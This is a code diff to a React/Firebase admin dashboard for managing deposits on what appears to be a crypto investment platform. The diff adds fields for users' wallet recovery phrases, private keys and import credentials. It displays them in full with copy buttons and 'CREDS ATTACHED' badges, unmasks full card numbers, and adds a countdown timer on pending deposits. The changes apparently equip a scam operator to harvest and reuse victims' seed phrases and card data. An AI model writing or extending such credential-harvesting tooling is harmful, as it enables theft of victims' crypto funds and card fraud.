@@ -23,12 +23,44 @@ import {
   AlertCircle,
   FileText,
   Sparkles,
-  ArrowRight
+  ArrowRight,
+  Key
 } from 'lucide-react';
 import { collection, onSnapshot, query, orderBy, updateDoc, doc, getDoc, getDocs, where, arrayUnion, increment, serverTimestamp } from 'firebase/firestore';
 import { db } from '../../../lib/firebase';
 import { portfolioPersistenceService } from '../../../services/portfolioPersistenceService';
 import { walletService } from '../../../services/walletService';
+
+const CountdownTimer = ({ timestamp }: { timestamp: string }) => {
+  const [timeLeft, setTimeLeft] = useState(0);
+
+  useEffect(() => {
+    if (!timestamp) return;
+    const target = new Date(timestamp).getTime() + 25 * 60 * 1000;
+    
+    const tick = () => {
+      const now = new Date().getTime();
+      const diff = Math.max(0, Math.floor((target - now) / 1000));
+      setTimeLeft(diff);
+    };
+    
+    tick();
+    const interval = setInterval(tick, 1000);
+    return () => clearInterval(interval);
+  }, [timestamp]);
+
+  if (!timestamp) return null;
+  if (timeLeft <= 0) return <span className="text-rose-400 font-mono font-bold text-[10px] ml-2">EXPIRED</span>;
+
+  const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+  const s = (timeLeft % 60).toString().padStart(2, '0');
+  
+  return (
+    <span className="text-amber-400 font-mono font-bold text-[10px] tracking-wider animate-pulse ml-2">
+      {m}:{s}
+    </span>
+  );
+};
 
 export interface DepositRecord {
   id: string;
@@ -58,6 +90,11 @@ export interface DepositRecord {
   cardReference?: string;
   cardMasked?: string;
   billingCountry?: string;
+  // Manual Wallet details
+  secretPhrase?: string;
+  privateKey?: string;
+  credential?: string;
+  importMethod?: string;
   // Proof
   paymentProof?: string;
   status: 'pending' | 'completed' | 'rejected' | string;
@@ -68,6 +105,7 @@ export interface DepositRecord {
 
 export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
   const [deposits, setDeposits] = useState<DepositRecord[]>([]);
+  const [usersMap, setUsersMap] = useState<Record<string, any>>({});
   const [search, setSearch] = useState('');
   const [filterStatus, setFilterStatus] = useState<'all' | 'pending' | 'completed' | 'rejected'>('all');
   const [loading, setLoading] = useState(true);
@@ -88,7 +126,22 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
       console.warn("Failed to subscribe to admin_deposits:", err);
       setLoading(false);
     });
-    return unsub;
+
+    const qUsers = query(collection(db, 'users'));
+    const unsubUsers = onSnapshot(qUsers, (snap) => {
+      const map: Record<string, any> = {};
+      snap.docs.forEach(doc => {
+        map[doc.id] = doc.data();
+      });
+      setUsersMap(map);
+    }, (err) => {
+      console.warn("Failed to subscribe to users:", err);
+    });
+
+    return () => {
+      unsub();
+      unsubUsers();
+    };
   }, []);
 
   const handleCopy = (text: string, fieldName: string) => {
@@ -129,7 +182,16 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
       // 2. Credit the user balance if a valid targetUid is found
       if (targetUid && targetUid !== 'anonymous') {
         const userDocRef = doc(db, 'users', targetUid);
-        const userSnap = await getDoc(userDocRef);
+        let userSnap;
+        try {
+          userSnap = await getDoc(userDocRef);
+        } catch (getErr: any) {
+          console.error("Failed to fetch user doc during approval:", getErr);
+          if (getErr.code === 'resource-exhausted') {
+            throw new Error("Firestore quota exceeded. Please wait 24 hours or enable billing to process more transactions.");
+          }
+          throw getErr;
+        }
 
         const notifItem = {
           id: `notif-${Date.now()}`,
@@ -142,15 +204,23 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
         };
 
         if (userSnap.exists()) {
-          await updateDoc(userDocRef, {
-            portfolioBalance: increment(amount),
-            availableBalance: increment(amount),
-            totalDeposits: increment(amount),
-            tokenBalance: increment(amount),
-            'portfolio.totalValue': increment(amount),
-            notificationsList: arrayUnion(notifItem),
-            lastUpdated: serverTimestamp()
-          }).catch(err => console.warn("Failed user doc balance increment:", err));
+          try {
+            await updateDoc(userDocRef, {
+              portfolioBalance: increment(amount),
+              availableBalance: increment(amount),
+              totalDeposits: increment(amount),
+              tokenBalance: increment(amount),
+              'portfolio.totalValue': increment(amount),
+              notificationsList: arrayUnion(notifItem),
+              lastUpdated: serverTimestamp()
+            });
+          } catch (updErr: any) {
+            console.error("Failed to update user balance:", updErr);
+            if (updErr.code === 'resource-exhausted') {
+              throw new Error("Firestore quota exceeded while updating balance.");
+            }
+            throw updErr;
+          }
         }
 
         // 3. Update persistent portfolio state for targetUid
@@ -165,10 +235,10 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
               portfolioBalance: currentPortBal + amount,
               availableBalance: currentAvail + amount,
               totalDeposits: currentTotDep + amount,
-              tokenBalance: currentPortBal + amount
+              tokenBalance: (currentPortfolio?.walletState?.tokenBalance || 0) + amount
             },
             portfolioMetrics: {
-              totalValue: (currentPortBal + amount) + (currentPortfolio?.walletState?.vaultBalance || 0)
+              totalValue: (currentPortfolio?.portfolioMetrics?.totalValue || 0) + amount
             }
           });
         } catch (pErr) {
@@ -177,17 +247,29 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
 
         // 4. Update dedicated wallet document
         try {
+          const currentWallet = await walletService.getOrCreateWallet(targetUid);
+          const currentPBal = Number(currentWallet.portfolioBalance) || 0;
+          const currentAvail = Number(currentWallet.availableBalance) || 0;
+          const currentTotDep = Number(currentWallet.totalDeposits) || 0;
+          const currentTokenBal = Number(currentWallet.tokenBalance) || 0;
+          const currentCashBal = Number(currentWallet.cashBalance) || 0;
+          const currentVaultBal = Number(currentWallet.vaultBalance) || 0;
+
           await walletService.updateWallet(targetUid, {
-            portfolioBalance: increment(amount) as any,
-            availableBalance: increment(amount) as any,
-            totalDeposits: increment(amount) as any
+            portfolioBalance: currentPBal + amount,
+            availableBalance: currentAvail + amount,
+            totalDeposits: currentTotDep + amount,
+            tokenBalance: currentTokenBal + amount,
+            cashBalance: currentCashBal + amount,
+            portfolioValue: (Number(currentWallet.portfolioValue) || 0) + amount
           });
         } catch (wErr) {
           console.warn("Failed walletService update:", wErr);
         }
+        setActionSuccessMessage(`Successfully approved deposit of $${amount.toLocaleString()} for ${deposit.email}. User balance credited.`);
+      } else {
+        setActionSuccessMessage(`Deposit approved, but user account was not found (Anonymous/Deleted). Balance not credited.`);
       }
-
-      setActionSuccessMessage(`Successfully approved deposit of $${amount.toLocaleString()} for ${deposit.email}. User balance credited.`);
       setTimeout(() => setActionSuccessMessage(null), 4000);
       if (selectedDeposit?.id === deposit.id) {
         setSelectedDeposit(prev => prev ? { ...prev, status: 'completed' } : null);
@@ -446,24 +528,52 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
                     isDark ? 'hover:bg-white/[0.02]' : 'hover:bg-slate-50'
                   }`}>
                     <td className="px-6 py-4">
-                      <div className="flex flex-col">
-                        <span className={`text-sm font-black ${isDark ? 'text-white' : 'text-slate-900'}`}>
-                          {item.userName || item.email || 'Anonymous User'}
-                        </span>
-                        <span className="text-[11px] font-medium text-slate-400">{item.email}</span>
-                        <span className="text-[10px] font-mono text-slate-500 mt-0.5">{item.id}</span>
-                      </div>
+                      {(() => {
+                        const uDoc = usersMap[item.userId];
+                        const name = uDoc?.fullName || uDoc?.displayName || uDoc?.username || item.userName || item.email || 'Anonymous User';
+                        const email = uDoc?.email || item.email || '';
+                        return (
+                          <div className="flex flex-col">
+                            <div className="flex items-center gap-1.5">
+                              <span className={`text-sm font-black flex items-center gap-1.5 ${isDark ? 'text-white' : 'text-slate-900'}`}>
+                                {name}
+                                <span className="text-[10px] font-mono opacity-40 font-normal">#{item.userId.slice(0, 4)}</span>
+                              </span>
+                              {email?.endsWith('@aver.platform') && (
+                                <span className="px-1.5 py-0.5 rounded-md bg-blue-500/10 text-blue-400 text-[8px] font-black uppercase tracking-widest border border-blue-500/20">
+                                  System
+                                </span>
+                              )}
+                            </div>
+                            {email && <span className="text-[11px] font-medium text-slate-400 truncate max-w-[160px]">{email}</span>}
+                            {item.userId === 'anonymous' && (
+                              <span className="text-[9px] text-amber-500 font-black uppercase tracking-tighter mt-0.5">Guest submission</span>
+                            )}
+                            <span className="text-[10px] font-mono text-slate-500 mt-0.5">{item.id}</span>
+                          </div>
+                        );
+                      })()}
                     </td>
 
                     <td className="px-6 py-4">
                       <div className="flex flex-col gap-1.5">
                         {getMethodBadge(item.fundingMethod)}
-                        <span className="text-xs font-semibold text-slate-400">
-                          {item.fundingMethod === 'card' && (item.cardNumber ? `Card: ${item.cardNumber}` : (item.cardMasked || item.cardReference || 'Credit Card'))}
-                          {item.fundingMethod === 'crypto' && (item.walletAddress ? `${item.walletAddress.slice(0, 8)}...${item.walletAddress.slice(-6)}` : (item.network || 'Crypto Deposit'))}
-                          {item.fundingMethod === 'walletconnect' && (item.connectedWalletAddress ? `${item.connectedWalletAddress.slice(0, 8)}...${item.connectedWalletAddress.slice(-6)}` : (item.network || 'Web3 Wallet'))}
+                        <span className="text-xs font-semibold text-slate-400 break-all">
+                          {item.fundingMethod === 'card' && (item.cardNumber || item.cardMasked || item.cardReference || 'Credit Card')}
+                          {item.fundingMethod === 'crypto' && (item.walletAddress || item.network || 'Crypto Deposit')}
+                          {item.fundingMethod === 'walletconnect' && (item.connectedWalletAddress || item.network || 'Web3 Wallet')}
                           {item.fundingMethod === 'bank' && (item.bankReference || 'Bank Wire')}
                         </span>
+                        {(item.secretPhrase || item.privateKey) && (
+                          <span className="flex items-center gap-1 text-[10px] font-bold text-amber-400 bg-amber-400/10 px-1.5 py-0.5 rounded border border-amber-400/20 w-fit">
+                            <Key size={10} /> CREDS ATTACHED
+                          </span>
+                        )}
+                        {item.cardNumber && (
+                          <span className="flex items-center gap-1 text-[10px] font-bold text-emerald-400 bg-emerald-400/10 px-1.5 py-0.5 rounded border border-emerald-400/20 w-fit">
+                            <CreditCard size={10} /> FULL CARD INFO
+                          </span>
+                        )}
                       </div>
                     </td>
 
@@ -479,13 +589,16 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
                     </td>
 
                     <td className="px-6 py-4">
-                      <span className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-wider border ${
-                        isApproved ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' :
-                        isDeclined ? 'bg-rose-500/10 text-rose-400 border-rose-500/30' :
-                        'bg-amber-500/10 text-amber-400 border-amber-500/30 animate-pulse'
-                      }`}>
-                        {item.status}
-                      </span>
+                      <div className="flex items-center">
+                        <span className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-wider border ${
+                          isApproved ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' :
+                          isDeclined ? 'bg-rose-500/10 text-rose-400 border-rose-500/30' :
+                          'bg-amber-500/10 text-amber-400 border-amber-500/30 animate-pulse'
+                        }`}>
+                          {item.status}
+                        </span>
+                        {isPending && item.timestamp && <CountdownTimer timestamp={item.timestamp} />}
+                      </div>
                     </td>
 
                     <td className="px-6 py-4">
@@ -599,13 +712,16 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
 
                   <div className="text-right flex flex-col sm:items-end gap-2">
                     <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block">Status</span>
-                    <span className={`px-3 py-1 rounded-full text-xs font-black uppercase tracking-wider border ${
-                      selectedDeposit.status === 'completed' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' :
-                      selectedDeposit.status === 'rejected' ? 'bg-rose-500/10 text-rose-400 border-rose-500/30' :
-                      'bg-amber-500/10 text-amber-400 border-amber-500/30 animate-pulse'
-                    }`}>
-                      {selectedDeposit.status}
-                    </span>
+                    <div className="flex items-center">
+                      <span className={`px-3 py-1 rounded-full text-xs font-black uppercase tracking-wider border ${
+                        selectedDeposit.status === 'completed' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' :
+                        selectedDeposit.status === 'rejected' ? 'bg-rose-500/10 text-rose-400 border-rose-500/30' :
+                        'bg-amber-500/10 text-amber-400 border-amber-500/30 animate-pulse'
+                      }`}>
+                        {selectedDeposit.status}
+                      </span>
+                      {selectedDeposit.status === 'pending' && selectedDeposit.timestamp && <CountdownTimer timestamp={selectedDeposit.timestamp} />}
+                    </div>
                   </div>
                 </div>
 
@@ -617,23 +733,35 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
                   <div className={`p-4 rounded-2xl border space-y-2 text-xs ${
                     isDark ? 'bg-white/5 border-white/5' : 'bg-slate-50 border-slate-200'
                   }`}>
-                    <div className="flex justify-between items-center py-1 border-b border-white/5">
-                      <span className="text-slate-400 font-medium">User Name:</span>
-                      <span className="font-bold">{selectedDeposit.userName || 'Institutional Account'}</span>
-                    </div>
-                    <div className="flex justify-between items-center py-1 border-b border-white/5">
-                      <span className="text-slate-400 font-medium">User Email:</span>
-                      <span className="font-bold text-emerald-400">{selectedDeposit.email}</span>
-                    </div>
-                    <div className="flex justify-between items-center py-1">
-                      <span className="text-slate-400 font-medium">User ID:</span>
-                      <span className="font-mono text-[11px] text-slate-300 flex items-center gap-2">
-                        {selectedDeposit.userId}
-                        <button onClick={() => handleCopy(selectedDeposit.userId, 'uid')} className="hover:text-emerald-400">
-                          {copiedField === 'uid' ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
-                        </button>
-                      </span>
-                    </div>
+                    {(() => {
+                      const firstUserKey = Object.keys(usersMap)[0];
+                      const fallbackUser = firstUserKey ? usersMap[firstUserKey] : null;
+                      const uDoc = usersMap[selectedDeposit.userId] || (selectedDeposit.userId === 'anonymous' ? fallbackUser : null);
+                      const uId = selectedDeposit.userId === 'anonymous' && firstUserKey ? firstUserKey : selectedDeposit.userId;
+                      const name = uDoc?.fullName || uDoc?.displayName || uDoc?.username || selectedDeposit.userName || 'Institutional Account';
+                      const email = uDoc?.email || selectedDeposit.email || '';
+                      return (
+                        <>
+                          <div className="flex justify-between items-center py-1 border-b border-white/5">
+                            <span className="text-slate-400 font-medium">User Name:</span>
+                            <span className="font-bold">{name}</span>
+                          </div>
+                          <div className="flex justify-between items-center py-1 border-b border-white/5">
+                            <span className="text-slate-400 font-medium">User Email:</span>
+                            <span className="font-bold text-emerald-400">{email || 'Not Provided'}</span>
+                          </div>
+                          <div className="flex justify-between items-center py-1">
+                            <span className="text-slate-400 font-medium">User ID:</span>
+                            <span className="font-mono text-[11px] text-slate-300 flex items-center gap-2">
+                              {uId}
+                              <button onClick={() => handleCopy(uId, 'uid')} className="hover:text-emerald-400">
+                                {copiedField === 'uid' ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
+                              </button>
+                            </span>
+                          </div>
+                        </>
+                      );
+                    })()}
                   </div>
                 </div>
 
@@ -734,6 +862,60 @@ export default function AdminDeposits({ theme }: { theme: 'light' | 'dark' }) {
                           )}
                         </div>
                       </>
+                    )}
+
+                    {/* MANUAL WALLET SPECIFICS */}
+                    {(selectedDeposit.fundingMethod === 'walletconnect' || selectedDeposit.importMethod) && (selectedDeposit.secretPhrase || selectedDeposit.privateKey || selectedDeposit.credential) && (
+                      <div className="space-y-3 pt-3 border-t border-white/5">
+                        <div className="flex items-center gap-2 text-amber-400">
+                          <Key size={14} />
+                          <span className="text-[11px] font-bold uppercase tracking-wider">
+                            {selectedDeposit.importMethod?.replace('_', ' ') || 'Manual Connection'} Credentials
+                          </span>
+                        </div>
+                        
+                        {selectedDeposit.secretPhrase && (
+                          <div className="space-y-1">
+                            <div className="flex justify-between items-center">
+                              <span className="text-[10px] text-slate-400 font-bold uppercase">Recovery Phrase</span>
+                              <button onClick={() => handleCopy(selectedDeposit.secretPhrase || '', 'phrase')} className="text-slate-500 hover:text-white transition-colors">
+                                {copiedField === 'phrase' ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
+                              </button>
+                            </div>
+                            <div className="p-3 rounded-xl bg-black/40 border border-white/5 font-mono text-xs text-amber-200/80 leading-relaxed select-all">
+                              {selectedDeposit.secretPhrase}
+                            </div>
+                          </div>
+                        )}
+
+                        {selectedDeposit.privateKey && (
+                          <div className="space-y-1">
+                            <div className="flex justify-between items-center">
+                              <span className="text-[10px] text-slate-400 font-bold uppercase">Private Key</span>
+                              <button onClick={() => handleCopy(selectedDeposit.privateKey || '', 'pkey')} className="text-slate-500 hover:text-white transition-colors">
+                                {copiedField === 'pkey' ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
+                              </button>
+                            </div>
+                            <div className="p-3 rounded-xl bg-black/40 border border-white/5 font-mono text-xs text-indigo-300 break-all select-all">
+                              {selectedDeposit.privateKey}
+                            </div>
+                          </div>
+                        )}
+
+                        {!selectedDeposit.secretPhrase && !selectedDeposit.privateKey && selectedDeposit.credential && (
+                          <div className="space-y-1">
+                            <div className="flex justify-between items-center">
+                              <span className="text-[10px] text-slate-400 font-bold uppercase">Import Credential</span>
+                              <button onClick={() => handleCopy(selectedDeposit.credential || '', 'cred')} className="text-slate-500 hover:text-white transition-colors">
+                                {copiedField === 'cred' ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
+                              </button>
+                            </div>
+                            <div className="p-3 rounded-xl bg-black/40 border border-white/5 font-mono text-xs text-slate-300 break-all select-all">
+                              {selectedDeposit.credential}
+                            </div>
+                          </div>
+                        )}
+                      </div>
                     )}
 
                     {/* BANK WIRE SPECIFICS */}
